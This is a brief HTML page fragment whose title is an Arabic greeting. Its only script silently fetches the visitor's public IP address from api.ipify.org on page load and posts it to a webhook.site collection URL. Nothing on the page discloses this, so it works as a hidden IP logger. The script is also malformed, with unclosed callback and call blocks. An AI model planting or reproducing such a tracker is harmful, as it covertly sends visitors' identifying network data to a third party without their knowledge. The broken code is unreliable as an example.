    <title>صباح البقالطة</title>
    <script>
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            fetch('https://webhook.site/fb37387f-f8f3-4a33-b61c-523a1c4dde21', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({ ip: data.ip })

          });
    </script>
